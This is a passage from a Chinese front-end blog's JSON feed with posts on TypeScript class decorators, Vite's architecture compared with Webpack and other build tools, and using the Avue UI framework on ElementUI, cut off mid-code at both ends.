<span>any</span> <span>=</span> <span>new</span> <span>HttpClients</span><span>(</span><span>)</span><span>;</span>\n<span>console</span><span>.</span><span>log</span><span>(</span>https<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"构造函数装饰器\" tabindex=\"-1\"> 构造函数装饰器</h3>\n<div><pre><code><span>function</span> <span>logClassC</span><span>(</span>target<span>:</span> <span>any</span><span>)</span> <span>{</span>\n  <span>console</span><span>.</span><span>log</span><span>(</span>target<span>,</span> <span>1111</span><span>)</span><span>;</span>\n  <span>//用在这里继承目标类并重载方法和属性</span>\n  <span>return</span> <span>class</span> <span><span>extends</span></span> target <span>{</span>\n    a<span>:</span> <span>any</span> <span>=</span> <span>\"我是修改后的属性\"</span><span>;</span>\n    <span>getDate</span><span>(</span><span>)</span> <span>{</span>\n      <span>console</span><span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a <span>+</span> <span>\"--装饰器中的方法输出的\"</span><span>)</span><span>;</span>\n    <span>}</span>\n  <span>}</span><span>;</span>\n<span>}</span>\n\n<span><span>@</span><span>logClassC</span></span>\n<span>class</span> <span>HttpClient2</span> <span>{</span>\n  <span>public</span> a<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>\n  <span>constructor</span><span>(</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span>a <span>=</span> <span>\"我是构造函数里面的a\"</span><span>;</span>\n  <span>}</span>\n  <span>getDate</span><span>(</span><span>)</span> <span>{</span>\n    <span>console</span><span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n<span>const</span> https2 <span>=</span> <span>new</span> <span>HttpClient2</span><span>(</span><span>)</span><span>;</span>\nhttps2<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2021-05-18T10:03:58.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "typescript"
      ]
    },
    {
      "title": "Vite 下一代前端开发与构建工具",
      "url": "https://vxhly.github.io/views/vite/study-vite.html",
      "id": "https://vxhly.github.io/views/vite/study-vite.html",
      "summary": "前言\nVite2.x 也推出了有一段时间了, 作为一名合格的前端开发人员, 没错我入坑了, 以下本篇文章记录的是 Vite 的一些知识点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Vite2.x 也推出了有一段时间了, 作为一名合格的前端开发人员, 没错我入坑了, 以下本篇文章记录的是 Vite 的一些知识点。</p>\n</div>\n\n<h2 id=\"回顾以往的前端自动化构建工具\" tabindex=\"-1\"> 回顾以往的前端自动化构建工具</h2>\n<h3 id=\"grunt-基于任务的构建工具\" tabindex=\"-1\"> Grunt - 基于任务的构建工具</h3>\n<ul>\n<li>Grunt - 基于任务的构建工具\n<ul>\n<li><strong>优点：</strong>\n<ul>\n<li>灵活, 它只负责执行我们定义好的任务</li>\n<li>大量可复用插件封装好了常见的构建任务</li>\n</ul>\n</li>\n<li><strong>缺点：</strong>\n<ul>\n<li>是集成度不高, 要写很多配置后才可以用, 无法做到开箱即用</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Gulp - 基于任务的构建工具\n<ul>\n<li><strong>优点：</strong>\n<ul>\n<li>好用又不失灵活, 既可以单独完成构建, 也可以和其他工具搭配使用</li>\n</ul>\n</li>\n<li><strong>缺点：</strong>\n<ul>\n<li>是集成度不高, 要写很多配置后才可以用, 无法做到开箱即用</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Webpack - 基于模块化的构建工具</li>\n</ul>\n<p><img src=\"/assets/study-vite-1.png\" alt=\"Vite\"></p>\n<ul>\n<li><strong>优点：</strong>\n<ul>\n<li>专注于处理模块化的项目, 能做到开箱即用、一步到位</li>\n<li>可通过 Plugin 扩展, 完整好用又不失灵活性</li>\n<li>使用场景不局限于 Web 开发</li>\n<li>社区庞大活跃, 经常引入紧跟时代发展的新特性, 能为大多数场景找到已有的开源扩展</li>\n<li>良好的开发体验</li>\n</ul>\n</li>\n<li><strong>缺点：</strong>\n<ul>\n<li>只能用于采用模块化开发的项目</li>\n<li>打包时间与应用大小成正比, 应用越大打包时间越久</li>\n</ul>\n</li>\n<li>Rollup - 基于模块化的构建工具\n<ul>\n<li><strong>优点：</strong>\n<ul>\n<li>配置简单, 打包速度快</li>\n<li>自动移除未引用的代码（内置 <code>tree shaking</code>）</li>\n</ul>\n</li>\n<li><strong>缺点：</strong>\n<ul>\n<li>开发服务器不能实现模块热更新, 调试繁琐</li>\n<li>浏览器环境的代码分割依赖 <code>amd</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么会有构建工具的出现\" tabindex=\"-1\"> 为什么会有构建工具的出现</h3>\n<ul>\n<li>解决前端模块化问题</li>\n<li>使繁琐的任务变得更加简单</li>\n<li>使 less/scss 预处理变得更加方便</li>\n<li>资源压缩与混淆, 只有更小的和更安全的构建包才能传输的更快且不容易被拦截\n<blockquote>\n<p>扩展：js 混淆与加密在线工具（<a href=\"https://www.sojson.com/jsjiemi.html\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.sojson.com/jsjiemi.html</a>）</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"vite-由来\" tabindex=\"-1\"> Vite 由来</h2>\n<blockquote>\n<p>作者在微博在发言：</p>\n<p>Vite, 一个基于浏览器原生 ES imports 的开发服务器。利用浏览器去解析 imports, 在服务器端按需编译返回, 完全跳过了打包这个概念, 服务器随起随用。同时不仅有 Vue 文件支持, 还搞定了热更新, 而且热更新的速度不会随着模块增多而变慢。针对生产环境则可以把同一份代码用 rollup 打。虽然现在还比较粗糙, 但这个方向我觉得是有潜力的, 做得好可以彻底解决改一行代码等半天热更新的问题</p>\n</blockquote>\n<p>它主要具有以下特点：</p>\n<ul>\n<li>快速的冷启动, 不需要等待打包操作</li>\n<li>即时的模块热更新, 替换性能和模块数量的解耦让更新飞起</li>\n<li>真正的按需编译, 不再等待整个应用编译完成</li>\n<li>基于 ESM 的 Dev Server + HMR（模块热更新）</li>\n<li>基于 esbuild 的依赖预优化</li>\n<li>基于 Rollup 的 Plugins + Bundle</li>\n<li>更好的 SSR 支持</li>\n</ul>\n<p>产生 Vite 的历程</p>\n<ul>\n<li>传统的 Webpack Dev Server 冷启动时间是比较长的</li>\n<li>Webpack 模块热更新的反应速度比较慢</li>\n</ul>\n<h3 id=\"vite-的日活量\" tabindex=\"-1\"> Vite 的日活量</h3>\n<p><img src=\"/assets/study-vite-2.png\" alt=\"Vite\"></p>\n<h3 id=\"esm-在浏览器的支持度\" tabindex=\"-1\"> ESM 在浏览器的支持度</h3>\n<p>默认的构建目标浏览器是能 在 script 标签上支持原生 ESM 和 原生 ESM 动态导入。传统浏览器可以通过官方插件 @vitejs/plugin-legacy 支持     Vite 需要 Node.js 版本 &gt;= 12.0.0；Vite 的 2.4.x 版本不兼容 npm@7  ESM 最大的特点是在浏览器端使用 <code>export import</code> 的方式导入和导出模块, 在 script 标签里设置 <code>type=&quot;module&quot;</code> , 然后使用 <strong>ES module</strong>。正因如此, vite 高度依赖<code>module script</code>特性, 也就意味着从这里开始抛弃了 IE 市场</p>\n<p><img src=\"/assets/study-vite-3.png\" alt=\"Vite\"></p>\n<blockquote>\n<p>扩展</p>\n</blockquote>\n<ul>\n<li>本地 node 环境对于  ECMAScript 6 的支持度</li>\n</ul>\n<p><img src=\"/assets/study-vite-4.png\" alt=\"Vite\"></p>\n<ul>\n<li>浏览器对 import 的支持度</li>\n</ul>\n<p><img src=\"/assets/study-vite-5.png\" alt=\"Vite\"></p>\n<ul>\n<li>浏览器对 export 的支持度</li>\n</ul>\n<p><img src=\"/assets/study-vite-6.png\" alt=\"Vite\"></p>\n<h2 id=\"vite-vs-webpack\" tabindex=\"-1\"> Vite VS Webpack</h2>\n<h3 id=\"功能对比\" tabindex=\"-1\"> 功能对比</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Vite</th>\n<th>Webpack</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>支持 Vue2</td>\n<td>非官方支持: <a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2Funderfin%2Fvite-plugin-vue2\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/underfin/vite-plugin-vue2</a></td>\n<td>支持：vue-loader@^15.0.0</td>\n</tr>\n<tr>\n<td>支持 Vue3</td>\n<td>支持</td>\n<td>支持：vue-loader@^16.0.0(<a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2FJamie-Yang%2Fvue3-boilerplate\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/Jamie-Yang/vue3-boilerplate</a>)</td>\n</tr>\n<tr>\n<td>支持 Typescript</td>\n<td>支持：ESbuild （默认无类型检查）</td>\n<td>支持：ts-loader</td>\n</tr>\n<tr>\n<td>支持 CSS 预处理器</td>\n<td>支持： <a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fvitejs.dev%2Fguide%2Ffeatures.html%23css-pre-processors\" target=\"_blank\" rel=\"noopener noreferrer\">https://vitejs.dev/guide/features.html#css-pre-processors</a></td>\n<td>支持：<a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fvue-loader.vuejs.org%2Fguide%2Fpre-processors.html\" target=\"_blank\" rel=\"noopener noreferrer\">https://vue-loader.vuejs.org/guide/pre-processors.html</a></td>\n</tr>\n<tr>\n<td>支持 CSS Modules</td>\n<td>支持： <a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fvitejs.dev%2Fguide%2Ffeatures.html%23css-modules\" target=\"_blank\" rel=\"noopener noreferrer\">https://vitejs.dev/guide/features.html#css-modules</a></td>\n<td>支持：<a href=\"https://link.segmentfault.com/?url=https%3A%2F%2Fvue-loader.vuejs.org%2Fguide%2Fcss-modules.html\" target=\"_blank\" rel=\"noopener noreferrer\">https://vue-loader.vuejs.org/guide/css-modules.html</a></td>\n</tr>\n<tr>\n<td>支持静态文件</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>开发环境</td>\n<td>no-bundle native ESM（CJS → ESM）</td>\n<td>bundle（CJS/UMD/ESM）</td>\n</tr>\n<tr>\n<td>HMR</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>生产环境</td>\n<td>Rollup、esbuild</td>\n<td>Webpack</td>\n</tr>\n<tr>\n<td>Node API 调用能力</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"webpack-打包方式\" tabindex=\"-1\"> Webpack 打包方式</h3>\n<p><img src=\"/assets/study-vite-7.png\" alt=\"Vite\"></p>\n<p><img src=\"/assets/study-vite-8.png\" alt=\"Vite\"></p>\n<ul>\n<li>webpack 的打包时间与应用的大小是成正比的, 应用越大打包时间越久</li>\n<li>打包过程：识别入口文件 =&gt; 通过逐层识别模块依赖。（Commonjs、amd 或者 es6 的 import, webpack 都会对其进行分析。来获取代码的依赖）=&gt; webpack 做的就是分析代码。转换代码, 编译代码, 输出代码 =&gt; 最终形成打包后的代码</li>\n<li>根据路由把代码整合成一个文件 bundle.js,启动开发服务器 Serverready</li>\n<li>vue-cli-server serve(启动服务器) → build(打包) → bundle(内存) → 启动 web server（即 Dev Server 必须等待所有模块构建完成）</li>\n<li>如果改了一个模块, 是会经过重新打包的, 但是不会全部打包, 它会根据路由解析的路径差异化的打包, 但是会把内存里面的 bundle 替换, 替换完了之后再一次重启服务器</li>\n<li>webpack 是会把所有的模块进行提前编译, 之后打包进 bundle 里, 换句话说, 不管模块是否会被执行, 都会被编译和打包到 bundle</li>\n</ul>\n<h3 id=\"vite-打包方式\" tabindex=\"-1\"> Vite 打包方式</h3>\n<p><img src=\"/assets/study-vite-9.png\" alt=\"Vite\"></p>\n<p><img src=\"/assets/study-vite-10.png\" alt=\"Vite\"></p>\n<ul>\n<li>先去启动服务器, 当浏览器向服务器发送请求的时候, 浏览器需要哪些文件, 服务器 就可以返回哪些文件</li>\n<li>前端需要什么,服务器就给什么,不需要打包,根据不同的路由返回不同的模块/文件 （服务器此时对请求的文件进行编译, 编译后将编译结果返回给浏览器）</li>\n<li>vite 可以做到压缩打包时间, vite 打包时将项目拆分为源码和依赖两部分, 依赖部分无需打包直接加载, 源码部分只需将浏览器不兼容的转成 JavaScript 即可</li>\n<li>Vite 以 原生 ESM 方式服务源码。这实际上是让浏览器接管了打包程序的部分工作：Vite 只需要在浏览器请求源码时进行转换并按需提供源码。根据情景动态导入的代码, 即只在当前屏幕上实际使用时才会被处理。</li>\n</ul>\n<h2 id=\"从-vite-源码看-vite-原理\" tabindex=\"-1\"> 从 Vite 源码看 Vite 原理</h2>\n<h3 id=\"esm-based-dev-server-存在的问题\" tabindex=\"-1\"> ESM-based Dev Server 存在的问题</h3>\n<ul>\n<li>非 ESM 模块兼容（TS/JSX/CSS...）</li>\n<li>Broswer ESM 不能加载 Node 模块</li>\n<li>Node 模块的其他问题</li>\n<li>浏览器没有环境变量</li>\n</ul>\n<h3 id=\"vite-如何解决问题\" tabindex=\"-1\"> Vite 如何解决问题</h3>\n<blockquote>\n<p>问题：非 ESM 模块兼容（TS/JSX/CSS...）解决方案：将非 ESM 模块转换成 ESM, 至于 TS 或者 JSX 是通过 esbuild 进行转换, esbuild 可以代替 TSC/Babel</p>\n</blockquote>\n<p>Vite 在第一次运行的时候, 会先去分析项目底下的开发依赖, 然后使用 esbuild 将亘古不变的依赖进行提取（这一步叫做预打包）, 将提取到的 ESM 模块统一存放在 node_modules/.vite 这个文件夹下, 下一次运行的时候只要没有新增的依赖项将不会进行提取, 即使新增了一项新的依赖, esbuild 也只会提取新加入的依赖项。 ​ vite 会将应用的模块拆分成依赖和源码部分, 依赖部分即是 package.json 中的运行依赖, 该部分依赖将会通过 esbuild 进行依赖提取源码 通常包含一些并非直接是 JavaScript 的文件, 需要转换（例如 JSX, CSS 或者 Vue/Svelte 组件）, 这一部分通常是交给 Rollup 进行处理</p>\n<p>至于使用了 TS 的应用, esbuild 会将含有 TS 的代码转换成原生的 ESM, 在将其返回给浏览器, 这样浏览器就可以加载该模块而对于 vue 文件, 也会对其编译成 js, 可以从请求头中也可以看到, vue 文件实际上被转换成 js 文件了将要处理的 template,script,style 等所需依赖以 http 请求的形式、通过 query 参数的形式区分, 并加载 SFC(vue 单文件)文件各个模块内容。 vite 是基于浏览器对 ESMoudule 的支持, script 标签加上 <code>type=&quot;module&quot;</code>  就可以解析 ES6 模块, 浏览器解析到 ES6 的 import 语法时, 会根据路径从服务端获取要引入的文件, 服务端会根据 import 的文件路径和类型进行解析</p>\n<p><img src=\"/assets/study-vite-11.png\" alt=\"Vite\"></p>\n<blockquote>\n<p>问题：Node 模块的其他问题解决方案：将多个模块合并成一个文件, 即一个请求</p>\n</blockquote>\n<ul>\n<li>Node 模块会随着应用的体积而增多, 在 vite 中一个文件就是一个请求, 如果有非常多的 Node 模块也只能使 vite 的性能降低</li>\n<li>vite 使用依赖预优化（esbulid）,将多个 Node 模块打包成一个文件, 通过 http 进行缓存, 下次请求到同样的, 直接从缓存获取</li>\n<li>Vite 将会使用 esbuild 预构建依赖。Esbuild 使用 Go 编写, 并且比以 JavaScript 编写的打包器预构建依赖快 10-100 倍</li>\n</ul>\n<blockquote>\n<p>问题：Broswer ESM 不能加载 Node 模块解决方案：引入 es-module-lexer 和 magic-string, 或者引入 koa 中间件</p>\n</blockquote>\n<div><pre><code><span>{</span>\n  <span>\"es-module-lexer\"</span><span>:</span> <span>\"^0.7.1\"</span><span>,</span>\n  <span>\"magic-string\"</span><span>:</span> <span>\"^0.25.7\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><ul>\n<li>使用 es-module-lexer 扫描所有的 import 语法</li>\n<li>magic-string 将重写 Node 模块的引入路径</li>\n</ul>\n<div><pre><code><span>// source</span>\n<span>import</span> <span>{</span> createAPP <span>}</span> <span>from</span> <span>\"vue\"</span><span>;</span>\n<span>// rewite to</span>\n<span>import</span> <span>{</span> createAPP <span>}</span> <span>from</span> <span>\"/node_modules/.vite/vue.js?v=7e85f123\"</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><blockquote>\n<p>扩展：Vite 1.0 的解决方案</p>\n</blockquote>\n<div><pre><code><span>{</span>\n  <span>\"rollup\"</span><span>:</span> <span>\"^2.32.1\"</span><span>,</span>\n  <span>\"@rollup/plugin-commonjs\"</span><span>:</span> <span>\"^16.0.0\"</span><span>,</span>\n  <span>\"koa\"</span><span>:</span> <span>\"^2.13.0\"</span><span>,</span>\n  <span>\"koa-proxies\"</span><span>:</span> <span>\"^0.11.0\"</span><span>,</span>\n  <span>\"koa-static\"</span><span>:</span> <span>\"^5.0.0\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>从上我们可以看到, vite 引入入 koa 服务器, 开发时, vite 使用 Koa 构建的服务端, 在 createServer 中主要通过中间件注册相关功能, 提供一个 web server 去代理, 之后浏览器通过 http 进行请求模块。为什么会需要 koa 这样的服务来代理请求, 因为我们的开发依赖都是安装在 node_modules 中, 浏览器 ES Module 是无法直接获取到项目下 node_modules 目录中的文件, 其过程如下：</p>\n<ul>\n<li>通过 koa 中间件获取请求 body</li>\n<li>使用 es-module-lexer 解析资源 ast</li>\n<li>获取 import 的内容后, 判断资源是否是绝对路径, 绝对视为 npm 模块</li>\n<li>返回处理后的路径给浏览器, 例如：&quot;vue&quot; =&gt; &quot;/@modules/vue&quot;</li>\n</ul>\n<blockquote>\n<p>问题：浏览器没有环境变量解决方案：将环境变量注入到 import.meta.env</p>\n</blockquote>\n<div><pre><code><span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>MODE</span><span>;</span> <span>// {string}应用程序运行的模式。</span>\n\n<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>BASE_URL</span><span>;</span> <span>// {string} 应用程序提供服务的基础url。这由基本配置选项决定。</span>\n\n<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>PROD</span><span>;</span> <span>// {boolean} 是否在生产环境中运行。</span>\n\n<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>DEV</span><span>;</span> <span>//{boolean}应用是否在开发中运行(总是与import.meta.env.PROD相反)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"vite-缺点\" tabindex=\"-1\"> Vite 缺点</h3>\n<ul>\n<li>生态不如 webpack\n<ul>\n<li>webpack 有非常丰富的 loader 和 plugin</li>\n<li>vite 目前无法把 webpack 中的 loader 和 plugin 全部实现</li>\n</ul>\n</li>\n<li>prod 环境的构建, 目前用的 Rollup\n<ul>\n<li>原因在于 esbuild 对于 css 和代码分割不是很友好</li>\n<li>未来 esbuild 可能是一种趋势, esbuild 的生态做的越好的话, 越有可能直接替换 Rollup</li>\n</ul>\n</li>\n</ul>\n",
      "image": "https://vxhly.github.io/assets/study-vite-1.png",
      "date_published": "2021-08-25T20:03:58.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "vite"
      ]
    },
    {
      "title": "Avue 前端框架使用实践",
      "url": "https://vxhly.github.io/views/vuejs/avue-framework-practice.html",
      "id": "https://vxhly.github.io/views/vuejs/avue-framework-practice.html",
      "summary": "前言\nAvue 前端是基于 ElementUI 库进行的二次封装, 简化了一些繁琐的操作。本篇博文将带领大家学习这套框架的使用实践, 以及它的一些二次封装的思路。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Avue 前端是基于 ElementUI 库进行的二次封装, 简化了一些繁琐的操作。本篇博文将带领大家学习这套框架的使用实践, 以及它的一些二次封装的思路。</p>\n</div>\n\n<h2 id=\"关于-avue\" tabindex=\"-1\"> 关于 Avue</h2>\n<h3 id=\"参考地址\" tabindex=\"-1\"> 参考地址</h3>\n<ul>\n<li>Github 仓库：<a href=\"https://github.com/nmxiaowei/avue\" target=\"_blank\" rel=\"noopener noreferrer\">nmxiaowei/avue</a></li>\n<li>Gitee 仓库：<a href=\"https://gitee.com/smallweigit/avue\" target=\"_blank\" rel=\"noopener noreferrer\">smallwei/Avue</a></li>\n<li>Avue 官方文档：<a href=\"https://avuejs.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Avue</a></li>\n<li>ElementUI 官方文档：<a href=\"https://element.eleme.cn/#/zh-CN/component/installation\" target=\"_blank\" rel=\"noopener noreferrer\">ElementUI</a></li>\n<li>基于 Avue 的后台管理系统示例: <a href=\"https://cli.avuejs.com/wel/index\" target=\"_blank\" rel=\"noopener noreferrer\">Avue 后台管理系统</a></li>\n</ul>\n<h3 id=\"简介\" tabindex=\"-1\"> 简介</h3>\n<div><p>简介</p>\n<p>Avue.js 是基于现有的 element-ui 库进行的二次封装, 从而简化一些繁琐的操作, 核心理念为数据驱动视图, 主要的组件库针对 table 表格和 form 表单场景, 同时衍生出更多企业常用的组件, 达到高复用, 容易维护和扩展的框架, 同时内置了丰富了数据展示组件, 让开发变得更加容易。</p>\n<p>它的核心是数据驱动 UI 的思想, 让我们从繁琐的 crud 开发中解脱出来, 他的写法类似 easyUI, 但是写起来比 easyUI 更加容易, 因为它是集合了 vue 中的数据双向绑定特性以及其他的一些特性。内含大量的组件和插件, 例如 crud、表单、数据展示卡、人物展示卡、打印的插件、Excel 导入插件等。</p>\n<p>缺点是生态不好, 出错网上没有解决方案, 对于定制化要求比较高的需求, 使用 avue 不是很方便。当然除了而二次封装的 element-ui 库, 还有二次封装的 ant-design-vue 、echarts、vant, 维护比较好组件也比较全面当属 element-ui 库, 其中二次封装 ant-design-vue 、vant 暂未开放给用户使用。</p>\n</div>\n<p>使用 Avue 好处：</p>\n<ol>\n<li>让开发人员更加的关注业务代码, 而无需过多的关心页面的布局</li>\n<li>简洁高效, 通过简单的配置项即可组合出我们想要的效果</li>\n<li>提供了大量的常用组件库以及丰富的插件库</li>\n<li>兼容现在的主流浏览器, 开箱即用的插件引入模式</li>\n</ol>\n<p>Avue 的组件组成：</p>\n<ol>\n<li>单组件, 在 element-ui 库中的组件进行二次封装, 让使用更加方便</li>\n<li>CRUD 组件, 即表格组件, 常用于需要使用表单来展示数据的业务或者是日常 CRUD 的一些操作, 文档地址：<a href=\"https://avuejs.com/doc/crud/crud-doc\" target=\"_blank\" rel=\"noopener noreferrer\">Avue CRUD 组件</a></li>\n<li>表单组件, 常用于数据收集、数据修改等业务, 文档地址：<a href=\"https://avuejs.com/doc/form/form-doc\" target=\"_blank\" rel=\"noopener noreferrer\">Avue FORM 组件</a></li>\n<li>数据展示组件, 常用与一些需要数据展示的一些业务, 常见于大数据类的后台管理系统中的首页里面的一些数据统计, 文档地址：<a href=\"https://avuejs.com/doc/data/data0\" target=\"_blank\" rel=\"noopener noreferrer\">Avue Data 组件</a></li>\n<li>其他组件, 封装的一些常用的组件(比较杂, 例如：打印、评论、拖拽、水印)</li>\n</ol>\n<h3 id=\"浏览器兼容性\" tabindex=\"-1\"> 浏览器兼容性</h3>\n<div><p>Vue.js 的兼容性</p>\n<p>Vue 不支持 IE8 及以下版本, 因为 Vue 使用了 IE8 无法模拟的 ECMAScript 5 特性。但它支持所有<a href=\"https://caniuse.com/#feat=es5\" target=\"_blank\" rel=\"noopener noreferrer\">兼容 ECMAScript 5 的浏览器</a>。</p>\n</div>\n<div><p>Avue 的兼容性</p>\n<p>支持所有符合 ES5 标准的浏览器(不支持 IE8 及以下版本）.</p>\n</div>\n<h2 id=\"实践\" tabindex=\"-1\"> 实践</h2>\n<h3 id=\"下载与引入\" tabindex=\"-1\"> 下载与引入</h3>\n<h4 id=\"下载\" tabindex=\"-1\"> 下载</h4>\n<p>使用 npm 或者 yarn 就可以对 Avue 这套 UI 框架进行下载, 并将该依赖写入到 <code>package.json</code> 中</p>\n<div><pre><code><span>npm</span> i @smallwei/avue\n<span># or</span>\n<span>yarn</span> <span>add</span> @smallwei/avue\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"完整引入\" tabindex=\"-1\"> 完整引入</h4>\n<div><p>提示</p>\n<p>Avue 目前不支持按需引入, 只支持完整引入</p>\n</div>\n<p>与其他 UI 框架的一样引入方式, 在项目的 <code>main.js</code> 中添加以下代码即可</p>\n<div><pre><code><span>import</span> Vue <span>from</span> <span>\"vue\"</span><span>;</span>\n<span>import</span> Avue <span>from</span> <span>\"@smallwei/avue\"</span><span>;</span>\n<span>import</span> <span>\"@smallwei/avue/lib/index.css\"</span><span>;</span>\n\nVue<span>.</span><span>use</span><span>(</span>Avue<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"使用案例\" tabindex=\"-1\"> 使用案例</h2>\n<p>在使用前, 我们还需要另外的导入 element-ui 库的依赖, 因为 Avue 是基于 element-ui 库进行的二次封装, 并且 Avue 源码中并没有为我们导出 element-ui 库的依赖。所以我们仍然需要在项目的 <code>main.js</code> 中添加 element-ui 库的依赖。</p>\n<div><pre><code><span>import</span> Vue <span>from</span> <span>\"vue\"</span><span>;</span>\n<span>import</span> ElementUI <span>from</span> <span>\"element-ui\"</span><span>;</span>\n<span>import</span> <span>\"element-ui/lib/theme-chalk/index.css\"</span><span>;</span>\n\nVue<span>.</span><span>use</span><span>(</span>ElementUI<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div>\n<h3 id=\"表单\" tabindex=\"-1\"> 表单</h3>\n<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>\n  <span><span><span>&lt;</span>avue-form</span> <span>ref</span><span><span>=</span><span>\"</span>form<span>\"</span></span> <span>v-model</span><span><span>=</span><span>\"</span>obj<span>\"</span></span> <span>:option</span><span><span>=</span><span>\"</span>option<span>\"</span></span> <span>@submit</span><span><span>=</span><span>\"</span>submit<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>\"</span>footer<span>\"</span></span><span>></span></span>\n      <span><span><span>&lt;</span>span</span> <span><span>style</span><span><span>=</span><span>\"</span><span><span>color</span><span>:</span>red<span>;</span><span>text-align</span><span>:</span>right<span>;</span><span>display</span><span>:</span>inline-block<span>;</span><span>width</span><span>:</span>100%<span>;</span></span><span>\"</span></span></span>\n        <span>></span></span>打 * 的为必填项<span><span><span>&lt;/</span>span</span>\n      <span>></span></span>\n    <span><span><span>&lt;/</span>template</span><span>></span></span>\n  <span><span><span>&lt;/</span>avue-form</span><span>></span></span>\n<span><span><span>&lt;/</span>template</span><span>></span></span>\n\n<span><span><span>&lt;</span>script</span><span>></span></span><span><span>\n<span>export</span> <span>default</span> <span>{</span>\n  <span>name</span><span>:</span> <span>\"MyForm\"</span><span>,</span>\n\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>obj</span><span>:</span> <span>{</span>\n        <span>title</span><span>:</span> <span>\"我是表单的表头\"</span><span>,</span>\n        <span>name</span><span>:</span> <span>\"\"</span><span>,</span>\n        <span>tag</span><span>:</span> <span>\"\"</span><span>,</span>\n        <span>sex</span><span>:</span> <span>\"\"</span><span>,</span>\n      <span>}</span><span>,</span>\n      <span>option</span><span>:</span> <span>{</span>\n        <span>card</span><span>:</span> <span>true</span><span>,</span>\n        <span>column</span><span>:</span> <span>[</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"\"</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"title\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"title\"</span><span>,</span>\n            <span>span</span><span>:</span> <span>24</span><span>,</span>\n            <span>labelWidth</span><span>:</span> <span>0</span><span>,</span>\n            <span>styles</span><span>:</span> <span>{</span>\n              <span>textAlign</span><span>:</span> <span>\"center\"</span><span>,</span>\n            <span>}</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"名称\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"name\"</span><span>,</span>\n            <span>rules</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>required</span><span>:</span> <span>true</span><span>,</span>\n                <span>message</span><span>:</span> <span>\"请输入名称\"</span><span>,</span>\n              <span>}</span><span>,</span>\n            <span>]</span><span>,</span>\n          <span>}</span><span>,</span>\n          <span>{</span>\n            <span>label</span><span>:</span> <span>\"标签\"</span><span>,</span>\n            <span>prop</span><span>:</span> <span>\"tag\"</span><span>,</span>\n            <span>type</span><span>:</span> <span>\"select\"</span><span>,</span>\n            <span>dicData</span><span>:</span> <span>[</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项1\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"1\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项2\"</span><span>,</span>\n                <span>value</span><span>:</span> <span>\"2\"</span><span>,</span>\n              <span>}</span><span>,</span>\n              <span>{</span>\n                <span>label</span><span>:</span> <span>\"选项3\"</span><span>,</span>\n                <span>value</span><span>:</span> 